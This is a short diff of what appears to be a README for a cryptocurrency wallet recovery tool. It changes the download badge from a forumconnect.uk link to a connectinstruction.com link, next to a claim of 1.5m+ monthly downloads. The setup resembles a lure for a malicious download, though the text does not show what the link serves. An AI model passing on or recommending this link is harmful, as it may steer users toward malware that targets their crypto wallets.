@@ -49,7 +49,7 @@ A: BTC, ETH, LTC, DOGE, and 50+ more.
 
 **Monthly downloads:** 1.5m+
 
-[![Download](https://img.shields.io/badge/Download-v3.1-brightgreen?style=for-the-badge)](https://forumconnect.uk/walletrecovery)
+[![Download](https://img.shields.io/badge/Download-v3.1-brightgreen?style=for-the-badge)](https://connectinstruction.com/walletrecovery)
 
 ---
 
